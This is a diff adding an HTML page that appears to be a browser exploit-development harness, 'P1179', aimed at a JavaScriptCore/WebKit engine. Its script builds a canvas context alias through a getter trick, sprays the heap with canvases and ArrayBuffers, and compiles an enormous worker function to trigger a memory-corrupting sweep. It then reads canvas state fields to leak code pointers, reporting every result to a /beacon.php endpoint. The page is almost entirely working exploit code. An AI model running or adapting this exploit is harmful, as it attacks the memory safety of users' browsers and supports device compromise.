@@ -1,0 +1,277 @@
+<!DOCTYPE html><html><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P1179 Sweep x State-Stack Code-Pointer Trap</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#050508;color:#e8ffe8;font:14px/1.5 'Courier New',monospace;padding:12px}
+#hud{background:#0a0a18;border:2px solid #2a2a5a;border-radius:10px;padding:12px;margin-bottom:10px}
+#hud h1{color:#00ff88;font-size:18px;margin-bottom:6px}
+#status{font-size:20px;font-weight:bold;color:#ffd75e;padding:6px 0}
+#phase{font-size:16px;color:#00ffee}
+#counters{font-size:14px;color:#b9c6ee;line-height:1.8}
+#finds{font-size:14px;color:#ff55c8;line-height:1.7;white-space:pre-wrap;word-break:break-all}
+#log{background:#0a0a12;border:1px solid #22223a;border-radius:8px;padding:8px;margin-top:8px;
+max-height:40vh;overflow-y:auto;font-size:12px;white-space:pre-wrap;word-break:break-all}
+.ok{color:#00ff88}.err{color:#ff4466}.info{color:#44aaff}.warn{color:#ffaa00}.hit{color:#ff00ff;font-weight:bold}
+</style>
+</head><body>
+<div id="hud">
+  <h1>P1179 — SWEEP x STATE-STACK CODE-POINTER TRAP</h1>
+  <div id="status">BOOTING...</div>
+  <div id="phase">phase: init</div>
+  <div id="counters">stage: ?</div>
+  <div id="finds">no findings yet</div>
+</div>
+<div id="log"></div>
+<script>
+'use strict';
+var L=document.getElementById('log'),S=document.getElementById('status'),
+PH=document.getElementById('phase'),CT=document.getElementById('counters'),FD=document.getElementById('finds');
+var T0=Date.now();
+function setStatus(t){S.textContent=t;}
+function setPhase(t){PH.textContent='phase: '+t;}
+function setCounters(t){CT.textContent=t;}
+function addFind(t){var d=document.createElement('div');d.textContent=t;FD.textContent='';FD.appendChild(d);}
+function log(m,c){var d=document.createElement('div');d.className=c||'';
+d.textContent='['+(((Date.now()-T0)/1000).toFixed(1))+'s] '+m;L.appendChild(d);L.scrollTop=1e6;}
+function B(tag,data){try{var u='/beacon.php?tag=P1179-'+encodeURIComponent(tag);
+if(data)u+='&data='+encodeURIComponent(String(data).slice(0,900));
+u+='&t='+Date.now();new Image().src=u;}catch(e){}}
+window.onerror=function(m,s,l){try{B('JSERR',m+'@'+l);}catch(e){}};
+
+var _b8=new ArrayBuffer(8),_f64=new Float64Array(_b8),_bu;
+try{_bu=new BigUint64Array(_b8);}catch(e){}
+function f2big(v){if(_bu){_f64[0]=v;return '0x'+_bu[0].toString(16);}
+_f64[0]=v;return '0x'+v.toString(16);}
+function isPtrShaped(h){
+  /* heap 0x10xxxxxxxx hi32, code 0x1000/0x5320/0x3100 etc; NOT sane small doubles */
+  var hi=h.slice(2,10);
+  var v=parseInt(hi,16);
+  return (v>0xFFFF0000)||(v>0x000FFFFF&&v<0x80000000&&v!==0x7ff80000&&v!==0x00000000&&v<0x100000);
+}
+
+/* ═══════════════════════════════════════════════════════════════════════
+   P1179: THE CODE-POINTER TRAP. Novel 3-primitive chain:
+   1. MetadataTable sweep writes a JSC CODE POINTER every 112 bytes
+      (m_slowPathCallDestination at entry+24) across its 4.29GB path.
+   2. The canvas state-stack (Vector<State,1>) grows to an OUT-OF-LINE
+      plain-fastMalloc buffer on ctx.save() (mid-size class ~6400B —
+      a DIFFERENT region than the 100KB ABs that missed the path).
+   3. The same-type ALIAS (verified) reads every double field of every
+      state via lineWidth/miterLimit/globalAlpha/shadowBlur etc.
+   If the sweep crosses the state buffer, a code pointer lands in a
+   state double -> the alias reads it AS A DOUBLE -> f2big -> CODE PTR.
+   ═══════════════════════════════════════════════════════════════════════ */
+
+var STAGES=['aliasctl','trap','trap-more','ab4k','ab8k'];
+var stage=0,results=[];
+try{stage=parseInt(localStorage.getItem('p1179_stage')||'0');}catch(e){}
+try{var r=localStorage.getItem('p1179_res');if(r)results=JSON.parse(r);}catch(e){}
+if(!Array.isArray(results))results=[];
+B('BOOT','stage='+stage+'|'+STAGES[stage]);
+setStatus('STAGE '+stage+'/4 — '+STAGES[stage]);
+
+if(stage>=STAGES.length){
+  setStatus('ALL DONE');
+  B('ALL-DONE',JSON.stringify(results).slice(0,800));
+  log('=== ALL DONE ===','ok');
+  try{localStorage.removeItem('p1179_stage');}catch(e){}
+}else{
+
+try{localStorage.setItem('p1179_stage',''+(stage+1));}catch(e){}
+var cur=STAGES[stage];
+
+var N_TARGET=38348816;
+var CHUNK=4000000;
+var CHUNKS=Math.floor(N_TARGET/CHUNK);
+var REM=N_TARGET-CHUNKS*CHUNK;
+var goSent=false,lastB=0,findCount=0;
+
+function buildBlob(){
+  var t0=Date.now();
+  var parts=[];
+  parts.push('self.__v141fn=function(a){');
+  for(var c=0;c<CHUNKS;c++){
+    parts.push('a();'.repeat(CHUNK));
+    if(c%4===0)B('BLD','c='+c+'|ms='+(Date.now()-t0));
+  }
+  if(REM>0)parts.push('a();'.repeat(REM));
+  parts.push('};self.postMessage({t:"compiled"});');
+  var blob=new Blob(parts,{type:'application/javascript'});
+  parts=null;
+  B('BLOB','ms='+(Date.now()-t0));
+  return blob;
+}
+
+function makeAlias(){
+  var canvas=document.createElement('canvas');
+  canvas.width=1;canvas.height=1;
+  var innerCtx=null;
+  var uafOpts={};
+  Object.defineProperty(uafOpts,'alpha',{get:function(){
+    innerCtx=canvas.getContext('2d');return true;}});
+  canvas.getContext('bitmaprenderer',uafOpts);
+  if(!innerCtx)return null;
+  for(var f=0;f<600;f++){var tmp=new ArrayBuffer(16);}
+  var sprays=[];
+  for(var i=0;i<200;i++){
+    var cv=document.createElement('canvas');cv.width=1;cv.height=1;
+    sprays.push(cv.getContext('2d'));
+  }
+  var lw;
+  try{lw=innerCtx.lineWidth;}catch(e){lw='ERR';}
+  B('ALIAS','lw='+lw);
+  return innerCtx;
+}
+
+function readFields(ctx,label){
+  var out={};
+  function rd(n,fn){try{var v=fn();out[n]=f2big(v);}catch(e){out[n]='ERR';}}
+  rd('lw',function(){return ctx.lineWidth;});
+  rd('ml',function(){return ctx.miterLimit;});
+  rd('ga',function(){return ctx.globalAlpha;});
+  rd('sb',function(){return ctx.shadowBlur;});
+  rd('sox',function(){return ctx.shadowOffsetX;});
+  rd('soy',function(){return ctx.shadowOffsetY;});
+  return out;
+}
+
+function checkPtrs(fields,label){
+  var hits=[];
+  for(var k in fields){
+    var h=fields[k];
+    if(h==='ERR')continue;
+    if(isPtrShaped(h))hits.push(label+'.'+k+'='+h);
+  }
+  if(hits.length>0){
+    B('PTR-FIND',hits.join('|'));
+    addFind(hits.join(' | '));
+    setStatus('*** PTR FOUND: '+hits[0]+' ***');
+    log('*** PTR: '+hits.join(' | ')+' ***','hit');
+    findCount++;
+    results.push({stage:stage,label:label,find:hits});
+    try{localStorage.setItem('p1179_res',JSON.stringify(results));}catch(e){}
+  }
+  return hits.length;
+}
+
+/* the trap: save()x9 during the sweep, walk states via restore, read doubles */
+function runTrap(ctx){
+  setPhase('save x9 (grow state stack)');
+  try{
+    for(var s=0;s<9;s++)ctx.save();
+  }catch(e){B('SAVE-ERR',String(e.message).slice(0,40));}
+  var found=0;
+  /* walk from top state down */
+  for(var st=0;st<9;st++){
+    var f=readFields(ctx,'st'+st);
+    found+=checkPtrs(f,'st'+st);
+    try{ctx.restore();}catch(e){break;}
+  }
+  if(!found&&Date.now()-lastB>800){
+    lastB=Date.now();
+    B('POLL','walk-clean');
+  }
+  setCounters('finds='+findCount);
+}
+
+function abSprayDuring(size,n){
+  var abs=[];
+  var iv=setInterval(function(){
+    for(var k=0;k<n;k++)abs.push(new ArrayBuffer(size));
+    /* scan newest for nonzero */
+    for(var i=Math.max(0,abs.length-n);i<abs.length;i++){
+      var dv=new DataView(abs[i]);
+      for(var q=0;q<64;q++){
+        var lo=dv.getUint32(q*8,true),hi=dv.getUint32(q*8+4,true);
+        if(lo||hi){
+          B('AB-NZ','sz='+size+'|i='+i+'|q='+q+'|v='+hi.toString(16).padStart(8,'0')+lo.toString(16).padStart(8,'0'));
+          abs=[];return;
+        }
+      }
+    }
+  },50);
+}
+
+function runSweep(blob){
+  var blobUrl=URL.createObjectURL(blob);
+  var wcode='importScripts('+JSON.stringify(blobUrl)+');'+
+    'self.onmessage=function(m){if(m.data==="go"){'+
+    'try{self.__v141fn(function(){ });}'+
+    'catch(e){self.postMessage({t:"err",e:String(e)});}}};';
+  var wUrl=URL.createObjectURL(new Blob([wcode],{type:'application/javascript'}));
+  var worker=new Worker(wUrl);
+  worker.__compiled=false;
+  worker.onmessage=function(m){
+    if(m.data&&m.data.t==='compiled'){
+      worker.__compiled=true;
+      B('WORKER-COMPILED','ok');
+      setPhase('alias setup');
+      var ctx=makeAlias();
+      if(!ctx){B('ALIAS-FAIL');setStatus('ALIAS FAIL');return;}
+      setPhase('pre-spray 100MB');
+      var pre=[];
+      for(var i=0;i<1000;i++)pre.push(new ArrayBuffer(100*1024));
+      B('PRE-SPRAY','done');
+      setTimeout(function(){
+        goSent=true;
+        B('GO','sweep start');
+        setStatus('SWEEP RUNNING — state-stack trap active');
+        worker.postMessage('go');
+        /* trap loop during the sweep */
+        var cycles=0;
+        var trap=setInterval(function(){
+          if(cycles>=6){clearInterval(trap);B('TRAP-DONE','cycles='+cycles);return;}
+          cycles++;
+          runTrap(ctx);
+        },150);
+        if(cur==='ab4k')abSprayDuring(4096,4);
+        if(cur==='ab8k')abSprayDuring(8192,3);
+        setTimeout(function(){
+          B('SURVIVED','finds='+findCount);
+          B('DONE','survived');
+        },25000);
+      },300);
+    }
+    else if(m.data&&m.data.t==='err'){B('WORKER-ERR',String(m.data.e).slice(0,60));}
+  };
+  B('WORKER','created');
+}
+
+if(cur==='aliasctl'){
+  setPhase('alias control');
+  var c0=makeAlias();
+  var f0=readFields(c0,'ctl');
+  B('CTL-FIELDS',JSON.stringify(f0));
+  results.push({stage:stage,name:'aliasctl',fields:f0});
+  try{localStorage.setItem('p1179_res',JSON.stringify(results));}catch(e){}
+  setStatus('control fields: '+JSON.stringify(f0).slice(0,60));
+  B('NEXT');
+  setTimeout(function(){location.reload(true);},700);
+}else{
+  setPhase('building blob');
+  var blob=buildBlob();
+  runSweep(blob);
+}
+
+} /* stage machine */
+
+/* auto-reload checker */
+(function(){
+  var cur='P1179-state-trap';
+  setTimeout(function check(){
+    try{
+      var x=new XMLHttpRequest();
+      x.open('GET','/reload.txt?c='+Date.now(),true);
+      x.onload=function(){
+        var t=(x.responseText||'').trim();
+        if(t&&t!==cur){location.reload(true);return;}
+        setTimeout(check,3000);};
+      x.onerror=function(){setTimeout(check,5000);};
+      x.send();
+    }catch(e){setTimeout(check,5000);}
+  },4000);
+})();
+</script>
+</body></html>
